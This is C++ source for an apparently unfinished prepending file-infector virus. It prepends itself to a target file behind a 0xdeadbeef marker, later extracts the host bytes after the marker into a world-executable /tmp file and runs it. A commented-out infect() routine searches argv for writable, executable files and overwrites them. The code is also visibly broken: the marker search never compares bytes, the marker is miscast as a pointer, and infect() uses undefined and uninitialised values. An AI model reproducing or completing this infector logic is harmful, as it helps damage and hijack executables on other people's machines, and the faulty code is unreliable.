#include <iostream>
#include <fstream>

#include <string>
#include <cstring>
#include <cstdlib>
#include <sys/stat.h>
#include <unistd.h>
#include <cstdio>

const u_int32_t SENTVAL = 0xdeadbeef;
std::streampos globalPos;

using namespace std;

// void infect(int argc, char *argv[], int fd_r){
//     int fd_t;
//     int target, i;
//     int done, bytes, length;
//     void *map;
//     struct stat stat;
//     char buf[BUFSIZ];


//     if (argc < 2){
//         return;
//     }
//     for(target = 1; target<argc; target++){
//         if(!access(argv[target], W_OK | X_OK)){
//             goto NAILED;
//         }
//     }
//     return;
//     NAILED:
//     fstat(fd_t, &stat);
//     length = stat.st_size;

//     map = (char *)malloc(length);
//     if (!map){
//         goto OUT;
//     }
//     for( i = 0; i < length; i++){
//         read(fd_t, map + i, 1);
//     }
//     lseek(fd_t, 0 , SEEK_SET);
//     if (ftruncate(fd_t, 0)){
//         goto OUT;
//     }
//     done = 0;
//     lseek(fd_r, 0, SEEK_SET);
//     while(done < V_OFFSET){
//         bytes = read(fd_r, buf, 1);
//         write(fd_t, buf, bytes);
//         done+=bytes;
//     }
//     OUT:
//         close(fd_t);
//         return;
// }

//doing some ridiculous shit because apparently you cant run tmpfile() because it gets stored in memory
void execFiles(FILE* f1, const string& f2){
    char tmpFile[] = "/tmp/hostXXX";
    
    //making temp file
    int f = mkstemp(tmpFile);
    if (f == -1){
        cerr <<"cant make file"<<"\n";
        return;
    }

    FILE* frun = fdopen(f, "wb");
    
    //making sure that the memory pointer is in the right spot
    rewind(f1);

    char buffer[BUFSIZ];
    size_t b;
    //while file has stuff left to read, read it into new file
    int debugfread = fread(buffer, 1, sizeof(buffer), f1);
    cout<<fread;
    while ((b = fread(buffer, 1, sizeof(buffer), f1)) > 0){
        fwrite(buffer, 1, b, frun);
    }
    fclose(frun);
    chmod(tmpFile, 0777);
    string runstring = "."+string(tmpFile) + " " + f2;
    system(runstring.c_str());
    return;

}

void findSentVal(const string& file, streampos& pos){
    //open file
    ifstream f(file, std::ios::binary);

    //create buffer
    char buffer[BUFSIZ];
    //read file into buffer and check for marker
    while(f.read(buffer, BUFSIZ) || f.gcount() > 0){
        size_t bytes1 = f.gcount();
        for (size_t i = 0; i < bytes1 - sizeof(SENTVAL)+1; i++){
            pos=f.tellg() - bytes1 + i;
            // globalPos = pos;
        }
    }
    return;
}

//takes the file after the 0xdeadbeef and makes a temporary file from it
//returns string of file path to temporary file
FILE* makeTmp (const string& fs, streampos pos){
    //creating tmp file
    char tmpFile[] = "/tmp/hostXXXXX";
    int f = mkstemp(tmpFile);
    if (f == -1){
        cerr<<"shits fucked cant make file(makeTmp)\n";
        return nullptr;
    }

    FILE* tmp = fdopen(f, "wb");
    if(!tmp){
        cerr<<"segfault found fucko\n";
    }
    //opening file and moving to position after marker
    ifstream file(fs, std::ios::binary);
    file.seekg(pos+sizeof(SENTVAL));

    //taking everything from after SENTVAL and putting it into the tmp file
    char buffer[BUFSIZ];
    while(file.read(buffer, sizeof(buffer))){
        fwrite(buffer, 1, file.gcount(), tmp);
    }
    //get rest of data into tmp
    if (file.gcount() > 0 ){
        fwrite(buffer, 1, file.gcount(), tmp);
    }
    rewind(tmp);
    return tmp;
}

void prepend(string& f1, string& f2){
    ifstream i1(f1, std::ios::binary);
    
    //open f2, prepend f1, add 0xdeadbeef marker
    ofstream out(f2, std::ios::binary);
    out << i1.rdbuf();
    out.write(reinterpret_cast<const char*>(SENTVAL), sizeof(SENTVAL));
    
    //open f2 to write append original contents after the marker
    ifstream i2(f2, std::ios::binary);
    out << i2.rdbuf();
    
    return;
}


int main (int argc, char *argv[]){
    string runningFile = argv[0];
    string f2 = argv[1];
    //get position of 0xdeadbeef
    //prepend(runningFile, f2);
    streampos pos;
    findSentVal(runningFile, pos);

    //debug
    cout << "0xdeadbeef at " << pos <<"\n";    

    //make file from content aftet 0xdeadbeef
    FILE* tmp1 = makeTmp(runningFile, pos);

    if(!tmp1){
        cerr << "shits fucked\n";
        return 1;
    }
    execFiles(tmp1, f2);
    return 0;
    


}